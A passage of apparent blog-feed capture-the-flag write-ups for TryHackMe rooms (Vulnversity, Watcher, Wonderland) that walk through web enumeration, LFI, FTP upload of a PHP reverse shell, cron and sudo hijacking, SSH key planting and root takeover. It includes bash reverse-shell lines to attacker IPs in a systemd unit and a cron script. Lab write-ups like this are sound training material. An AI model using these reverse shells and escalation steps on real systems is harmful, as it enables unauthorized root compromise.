&lt;h2 id=&#34;task-5---priviledge-escalation&#34;&gt;Task 5 - Priviledge Escalation&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;In Linux, SUID (set owner userId upon execution) is a special type of file permission given to a file. SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;For example, the binary file to change your password has the SUID bit set on it (/usr/bin/passwd). This is because to change your password, it will need to write to the shadowers file that you do not have access to, root does, so it has root privileges to make the right changes.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Using the command &lt;code&gt;find&lt;/code&gt;, we get:&lt;/p&gt;
&lt;h3 id=&#34;on-the-system-search-for-all-suid-files-what-file-stands-out&#34;&gt;On the system, search for all SUID files. What file stands out?&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;/bin/systemctl&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;become-root-and-get-the-last-flag-rootroottxt&#34;&gt;Become root and get the last flag (/root/root.txt)&lt;/h3&gt;
&lt;p&gt;For this privesc, I followed &lt;a class=&#34;link&#34; href=&#34;https://gist.github.com/A1vinSmith/78786df7899a840ec43c5ddecb6a4740&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Alvin Smith&amp;rsquo;s Privilege Escalation&lt;/a&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[Unit]
Description=roooooooooot

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.8.150.214/9999 0&amp;gt;&amp;amp;1&#39;

[Install]
WantedBy=multi-user.target
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Here are the steps:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;create a &lt;code&gt;root.service&lt;/code&gt; file on your machine with the details given above.&lt;/li&gt;
&lt;li&gt;Using the upload option in the &lt;code&gt;/internal/&lt;/code&gt; directory of the website, upload this file. It&amp;rsquo;ll throw and error of the extension as not permitted. Change &lt;code&gt;root.service&lt;/code&gt; to &lt;code&gt;root.phtml&lt;/code&gt; (why?) and you should be good to go.&lt;/li&gt;
&lt;li&gt;In the target machine, just rename the file again.&lt;/li&gt;
&lt;li&gt;Instead of 2, 3, you can also use &lt;code&gt;nc&lt;/code&gt; or any other methods you prefer.&lt;/li&gt;
&lt;li&gt;Run &lt;code&gt;/bin/systemctl enable /var/www/html/internal/uploads/root.service&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Start &lt;code&gt;nc&lt;/code&gt; on your machine, on the port you set in the &lt;code&gt;root.service&lt;/code&gt; file in step  1 (9999 here)&lt;/li&gt;
&lt;li&gt;Run &lt;code&gt;/bin/systemctl start root.service&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;PWN&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;www-data@vulnuniversity:/var/www/html/internal/uploads$ cat root.service
cat root.service
[Unit]
Description=roooooooooot

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.8.150.214/9999 0&amp;gt;&amp;amp;1&#39;

[Install]
WantedBy=multi-user.target
www-data@vulnuniversity:/var/www/html/internal/uploads$ /bin/systemctl enable /var/www/html/internal/uploads/root.service
&amp;lt;s$ /bin/systemctl enable /var/www/html/internal/uploads/root.service        
Created symlink from /etc/systemd/system/multi-user.target.wants/root.service to /var/www/html/internal/uploads/root.service.
Created symlink from /etc/systemd/system/root.service to /var/www/html/internal/uploads/root.service.
www-data@vulnuniversity:/var/www/html/internal/uploads$ /bin/systemctl start root.service
&amp;lt;r/www/html/internal/uploads$ /bin/systemctl start root.service 
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;❯ nc -lnvp 9999
listening on [any] 9999 ...
connect to [10.8.150.214] from (UNKNOWN) [10.10.185.229] 43756
bash: cannot set terminal process group (1792): Inappropriate ioctl for device
bash: no job control in this shell
root@vulnuniversity:/# whoami
whoami
root
root@vulnuniversity:/# cd /root
cd /root
root@vulnuniversity:~# ls
ls
root.txt
root@vulnuniversity:~# cat root.txt
cat root.txt
{hell yeah}
root@vulnuniversity:~# 
&lt;/code&gt;&lt;/pre&gt;</description>
        </item>
        <item>
        <title>TryHackMe: Watcher Writeup</title>
        <link>https://chaudhary1337.github.io/p/tryhackme-watcher-writeup/</link>
        <pubDate>Tue, 15 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://chaudhary1337.github.io/p/tryhackme-watcher-writeup/</guid>
        <description>&lt;img src="https://i.imgur.com/WSIsuRG.jpg" alt="Featured image of post TryHackMe: Watcher Writeup" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/watcher&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Play&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;1-enumeration--exploration&#34;&gt;1. Enumeration &amp;amp; Exploration&lt;/h2&gt;
&lt;h3 id=&#34;11-port-scanning&#34;&gt;1.1. Port Scanning&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -A 10.10.157.202
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-25 11:48 EDT
Nmap scan report for 10.10.157.202
Host is up (0.24s latency).
Not shown: 996 closed ports
PORT     STATE    SERVICE VERSION
21/tcp   open     ftp     vsftpd 3.0.3
22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e1:80:ec:1f:26:9e:32:eb:27:3f:26:ac:d2:37:ba:96 (RSA)
|   256 36:ff:70:11:05:8e:d4:50:7a:29:91:58:75:ac:2e:76 (ECDSA)
|_  256 48:d2:3e:45:da:0c:f0:f6:65:4e:f9:78:97:37:aa:8a (ED25519)
80/tcp   open     http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: Jekyll v4.1.1
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Corkplacemats
5815/tcp filtered unknown
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.88 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ftp, ssh, https. Notin too special. Let&amp;rsquo;s look at web stuff.&lt;/p&gt;
&lt;h3 id=&#34;12-web-enumeration&#34;&gt;1.2. Web Enumeration&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ gobuster dir -u 10.10.157.202 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 32 -q         
/images               (Status: 301) [Size: 315] [--&amp;gt; http://10.10.157.202/images/]
/css                  (Status: 301) [Size: 312] [--&amp;gt; http://10.10.157.202/css/]   
/server-status        (Status: 403) [Size: 278]   
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This was fairly slow &amp;hellip; and in the end unhelpful. Doing simultaneous exploration is a good idea!&lt;/p&gt;
&lt;h3 id=&#34;13-web-exploration&#34;&gt;1.3. Web Exploration&lt;/h3&gt;
&lt;p&gt;The homepage,
&lt;img src=&#34;https://i.imgur.com/c9ZFchq.png&#34; alt=&#34;homepage of the THM Watcher room&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;robots.txt&lt;/code&gt; is usually a good place to look.
&lt;img src=&#34;https://i.imgur.com/fPeuBjd.png&#34; alt=&#34;A screenshot of the page showing robots.txt file&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Yes! We have our first flag!&lt;/p&gt;
&lt;p&gt;Exploring more, we have the post structure &amp;hellip; sus. LFI?
&lt;img src=&#34;https://i.imgur.com/P6M7dH9.png&#34; alt=&#34;A page showing probable PHP LFI&#34;  /&gt;&lt;/p&gt;
&lt;h3 id=&#34;14-php-lfi&#34;&gt;1.4. PHP LFI&lt;/h3&gt;
&lt;p&gt;Let&amp;rsquo;s try some basic stuff. &lt;code&gt;../../../etc/hosts&lt;/code&gt; works!&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/TXKROye.png&#34; alt=&#34;/etc/hosts working. LFI present in the system.&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;How about &lt;code&gt;../../../etc/passwd&lt;/code&gt;
&lt;img src=&#34;https://i.imgur.com/mDVT7Sp.png&#34; alt=&#34;/etc/password working. Showing a list of interesting users.&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Interesting candidates:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;mat&lt;/li&gt;
&lt;li&gt;toby&lt;/li&gt;
&lt;li&gt;will&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Just to check, I tried getting &lt;code&gt;flag_1.txt&lt;/code&gt;. Worked. Then, I looked at the second file mentioned in the same &lt;code&gt;robots.txt&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/5n8Xta1.png&#34; alt=&#34;&#34;  /&gt;
We get the creds for ftp!&lt;/p&gt;
&lt;h3 id=&#34;15-ftp&#34;&gt;1.5 FTP&lt;/h3&gt;
&lt;p&gt;Log in.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ ftp 10.10.157.202
Connected to 10.10.157.202.
220 (vsFTPd 3.0.3)
Name (10.10.157.202:kali): *******
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&amp;gt; ls -la
dr-xr-xr-x    3 65534    65534        4096 Dec 03 01:58 .
dr-xr-xr-x    3 65534    65534        4096 Dec 03 01:58 ..
drwxr-xr-x    2 1001     1001         4096 Dec 03 03:30 files
-rw-r--r--    1 0        0              21 Dec 03 01:58 flag_2.txt
226 Directory send OK.
ftp&amp;gt; get flag_2.txt
ftp&amp;gt; cd files
ftp&amp;gt; ls -la
drwxr-xr-x    2 1001     1001         4096 Dec 03 03:30 .
dr-xr-xr-x    3 65534    65534        4096 Dec 03 01:58 ..
226 Directory send OK.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Clearly, the message in the file we saw on the web server hinted at directories being connected. We also have the ability to access local files &amp;hellip;&lt;/p&gt;
&lt;h3 id=&#34;16-lfi--ftp--rce&#34;&gt;1.6 LFI + FTP = RCE?&lt;/h3&gt;
&lt;p&gt;I tried putting in a file,&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ftp&amp;gt; put haha.png 
local: haha.png remote: haha.png
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
11007 bytes sent in 0.00 secs (37.4896 MB/s)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/qDyqE9I.png&#34; alt=&#34;File upload working using LFI vulnerability and FTP&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Works!&lt;/p&gt;
&lt;h2 id=&#34;2-foothold&#34;&gt;2. Foothold&lt;/h2&gt;
&lt;p&gt;Time to get in. Get the shell from &lt;a class=&#34;link&#34; href=&#34;http://revshells.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;RevShells&lt;/a&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ftp&amp;gt; cd files
250 Directory successfully changed.
ftp&amp;gt; put phprevshell.php 
local: phprevshell.php remote: phprevshell.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
2585 bytes sent in 0.00 secs (34.7218 MB/s)
ftp&amp;gt; 
221 Goodbye.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Start the listener.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.17.8.184] from (UNKNOWN) [10.10.157.202] 42726
Linux watcher 4.15.0-128-generic #131-Ubuntu SMP Wed Dec 9 06:57:35 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 16:25:10 up 39 min,  0 users,  load average: 0.00, 0.00, 0.19
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can&#39;t access tty; job control turned off
$ bash -i
bash: cannot set terminal process group (914): Inappropriate ioctl for device
bash: no job control in this shell
www-data@watcher:/$ 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And we have the flag!&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;www-data@watcher:/$ find -type f -name &#39;flag_3.txt&#39; 2&amp;gt;/dev/null
./var/www/html/more_secrets_******/flag_3.txt
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ez&lt;/p&gt;
&lt;h2 id=&#34;3-priv-esc&#34;&gt;3. Priv Esc&lt;/h2&gt;
&lt;h3 id=&#34;31-lateral-privesc-toby&#34;&gt;3.1. Lateral PrivEsc: Toby&lt;/h3&gt;
&lt;p&gt;Time to start getting to root.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;www-data@watcher:/$ sudo -l
sudo -l
Matching Defaults entries for www-data on watcher:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on watcher:
    (toby) NOPASSWD: ALL
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And that was pretty basic &amp;hellip;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;www-data@watcher:/$ sudo -u toby bash
sudo -u toby bash
whoami
toby
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Great. How about now looking at what toby got for us.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;toby@watcher:~$ ls
ls
flag_4.txt
jobs
note.txt
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;toby@watcher:~$ cat note.txt
cat note.txt
Hi Toby,

I&#39;ve got the cron jobs set up now so don&#39;t worry about getting that done.

Mat
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Exploring, we find the following. What a script. wow.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;toby@watcher:~/jobs$ cat cow.sh
cat cow.sh
#!/bin/bash
cp /home/mat/cow.jpg /tmp/cow.jpg
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The note mentions something to do with cron job. Let&amp;rsquo;s check &lt;code&gt;crontab&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;toby@watcher:/etc$ cat crontab
cat crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don&#39;t have to run the `crontab&#39;
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.monthly )
#
*/1 * * * * mat /home/toby/jobs/cow.sh
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;32-lateral-privesc-again-mat&#34;&gt;3.2. Lateral PrivEsc (again): Mat&lt;/h3&gt;
&lt;p&gt;We put a revshell command and &amp;hellip; we wait!&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;toby@watcher:~/jobs$ cat cow.sh
cat cow.sh
sh -i &amp;gt;&amp;amp; /dev/tcp/10.17.8.184/1234 0&amp;gt;&amp;amp;1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Listening.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1234         
listening on [any] 1234 ...
connect to [10.17.8.184] from (UNKNOWN) [10.10.157.202] 55854
sh: 0: can&#39;t access tty; job control turned off
$ whoami
mat
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We are in! Let&amp;rsquo;s explore.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;mat@watcher:~$ cat note.txt
cat note.txt
Hi Mat,

I&#39;ve set up your sudo rights to use the python script as my user. You can only run the script with sudo so it should be safe.

Will
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Why do they tell us what to do EXACTLY XD&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;mat@watcher:~/scripts$ sudo -l
sudo -l
Matching Defaults entries for mat on watcher:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mat may run the following commands on watcher:
    (will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py *
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;mat@watcher:~/scripts$ cat cmd.py
cat cmd.py
def get_command(num):
        if(num == &amp;quot;1&amp;quot;):
                return &amp;quot;ls -lah&amp;quot;
        if(num == &amp;quot;2&amp;quot;):
                return &amp;quot;id&amp;quot;
        if(num == &amp;quot;3&amp;quot;):
                return &amp;quot;cat /etc/passwd&amp;quot;
mat@watcher:~/scripts$ cat will_script.py
cat will_script.py
import os
import sys
from cmd import get_command

cmd = get_command(sys.argv[1])

whitelist = [&amp;quot;ls -lah&amp;quot;, &amp;quot;id&amp;quot;, &amp;quot;cat /etc/passwd&amp;quot;]

if cmd not in whitelist:
        print(&amp;quot;Invalid command!&amp;quot;)
        exit()

os.system(cmd)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Scripts are pretty straight forward. We can&amp;rsquo;t change all the return statements.&lt;/p&gt;
&lt;p&gt;Clearly, we need to have a bash command/another rev shell command somewhere before. This requires editing stuff.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;mat@watcher:~/scripts$ python3 -c &#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39;
python3 -c &#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39;
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;mat@watcher:~/scripts$ nano cmd.py
nano cmd.py
Error opening terminal: unknown.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Well &amp;hellip; time to ssh in. Follow the tanget to setup ssh below.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;mat@watcher:~$ mkdir .ssh
mkdir .ssh
mat@watcher:~$ cd .ssh
cd .ssh
mat@watcher:~/.ssh$ echo &amp;quot;ssh-rsa {blah blah blah} kali@kali&amp;quot; &amp;gt; authorized_keys
{some truncated stuff} kali@kali&amp;quot; &amp;gt; authorized_keys
mat@watcher:~/.ssh$ 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://community.perforce.com/s/article/6210&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;SSH permissions setting&lt;/a&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;mat@watcher:~/.ssh$ chmod 600 au
chmod 600 authorized_keys 
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;mat@watcher:~$ chmod 700 .ssh
chmod 700 .ssh
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~/.ssh]
└─$ ssh mat@10.10.157.202                           

...

mat@watcher:~$ 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;YES!&lt;/p&gt;
&lt;h3 id=&#34;33-lateral-privesc-again-again-will&#34;&gt;3.3 Lateral PrivEsc (again) (again): Will&lt;/h3&gt;
&lt;p&gt;We edit and spawn a shell.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;mat@watcher:~/scripts$ cat cmd.py 
import pty
def get_command(num):
        pty.spawn(&amp;quot;/bin/bash&amp;quot;)
        if(num == &amp;quot;1&amp;quot;):
                return &amp;quot;ls -lah&amp;quot;
        if(num == &amp;quot;2&amp;quot;):
                return &amp;quot;id&amp;quot;
        if(num == &amp;quot;3&amp;quot;):
                return &amp;quot;cat /etc/passwd&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;mat@watcher:~/scripts$ sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 1
will@watcher:~/scripts$ 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;noice.&lt;/p&gt;
&lt;h3 id=&#34;34-vertical-privesc&#34;&gt;3.4 Vertical PrivEsc&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/SPVaaSW.png&#34; alt=&#34;Transferring files to the remote machine using python http server&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;I did same for linpeas (my fav).&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[+] Readable files belonging to root and readable by me but not world readable
-rw-rw---- 1 root adm 2270 Dec  3 02:04 /opt/backups/key.b64                                                                                                            
-rw-r----- 1 root adm 21919802 May 25 16:59 /var/log/apache2/access.log
-rw-r----- 1 root adm 29610 May 25 16:59 /var/log/apache2/error.log
-rw-r----- 1 root adm 0 Dec  3 01:39 /var/log/apache2/other_vhosts_access.log
-rw-r----- 1 root adm 28898 Dec 12 15:23 /var/log/apt/term.log

&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;First file looks interesting. Lesse&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;will@watcher:/home/will$ cat /opt/backups/key.b64
LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcEFJQkFBS0NBUUVBelBhUUZvbFFx
...
LUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo=
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Looks like a id_rsa key format. Decoding base64, we get a private key!&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ ssh -i id_rsa root@10.10.157.202
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-128-generic x86_64)

...

Last login: Thu Dec  3 03:25:38 2020
root@watcher:~#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;System fully compromised!&lt;/p&gt;
</description>
        </item>
        <item>
        <title>TryHackMe: Wonderland Writeup</title>
        <link>https://chaudhary1337.github.io/p/tryhackme-wonderland-writeup/</link>
        <pubDate>Tue, 15 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://chaudhary1337.github.io/p/tryhackme-wonderland-writeup/</guid>
        <description>&lt;img src="https://i.imgur.com/wnL3bIR.jpg" alt="Featured image of post TryHackMe: Wonderland Writeup" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/wonderland&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Play&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;1-recon&#34;&gt;1. Recon&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;❯ nmap -script=default -sV -A -T4 10.10.133.60
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-26 21:51 EST
Nmap scan report for 10.10.133.60
Host is up (0.24s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Follow the white rabbit.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.75 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;❯ gobuster dir -u 10.10.133.60 -w &amp;quot;/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt&amp;quot; -x &amp;quot;txt,html,php&amp;quot;
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.133.60
[+] Threads:        10
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,html,php
[+] Timeout:        10s
===============================================================
2021/02/26 21:50:59 Starting gobuster
===============================================================
/index.html (Status: 301)
/img (Status: 301)
/r (Status: 301)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In &lt;code&gt;/img/&lt;/code&gt; i first tried downloading the images and doing &lt;code&gt;strings&lt;/code&gt;, I could not find anything interesting. Onto &lt;code&gt;/r/&lt;/code&gt;. It says&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/WDNs790.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Interesting. However, source shows nothing special here, and now I am stuck. But it does ask to go &lt;em&gt;somewhere&lt;/em&gt;. On a pure whim, I did:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://10.10.133.60/r/a/b/b/i/t/&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;very nice. One can also run gobuster with the url: &lt;code&gt;http://10.10.133.60/r/&lt;/code&gt; and keep on getting the letters.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/wXwyzP3.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;So now we want to go to the left. How? Well lets do &lt;code&gt;http://10.10.133.60/r/a/b/b/i/&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/EYBLHOF.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;The story continues!&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/4J1i4TS.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;After looking at some more, I realise: wait &amp;hellip; I&amp;rsquo;ve been going in the opposite direction! To quote:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;ldquo;Oh, you’re sure to do that,&amp;rdquo; said the Cat, &amp;ldquo;if you only walk long enough.&amp;rdquo;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;So we must go on &amp;hellip; but where? I don&amp;rsquo;t know.&lt;/p&gt;
&lt;p&gt;I was stuck for a while, and then stumbled upon the fact that its ssh &lt;code&gt;username:password&lt;/code&gt;. &amp;ldquo;Open the door&amp;rdquo; makes sense now lmao.&lt;/p&gt;
&lt;h2 id=&#34;2-foothold&#34;&gt;2. Foothold&lt;/h2&gt;
&lt;p&gt;I&amp;rsquo;m in!&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;alice@wonderland:~$ ls
root.txt  walrus_and_the_carpenter.py
alice@wonderland:~$ cat root.txt
cat: root.txt: Permission denied
alice@wonderland:~$ whoami
alice
alice@wonderland:~$ pwd
/home/alice
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Okay so the walrus thing is apparently a poem. The script is supposed to spew 10 random lines. very helpful.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;alice@wonderland:/home$ ls
alice  hatter  rabbit  tryhackme
alice@wonderland:/home$ cd rabbit/
-bash: cd: rabbit/: Permission denied
alice@wonderland:/home$ cd hatter/
-bash: cd: hatter/: Permission denied
alice@wonderland:/home$ cd tryhackme/
-bash: cd: tryhackme/: Permission denied
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I tried locating &lt;code&gt;user.txt&lt;/code&gt;, but I can&amp;rsquo;t &lt;code&gt;locate&lt;/code&gt; anything. Looking at the hint on TryHackMe, it could be in &lt;code&gt;/root/user.txt&lt;/code&gt;. It is!&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;rabbit@wonderland:/home/rabbit$ cat /root/user.txt
thm{:stonks:}
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;3-priv-esc&#34;&gt;3. Priv Esc&lt;/h2&gt;
&lt;p&gt;We may need to get into the rabbit one. Meanwhile, let&amp;rsquo;s check what we can sudo:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;alice@wonderland:~$ sudo -l
[sudo] password for alice: 
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ah so we can execute the script as rabbit. &lt;code&gt;alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This means we can spawn a shell as rabbit!&lt;/p&gt;
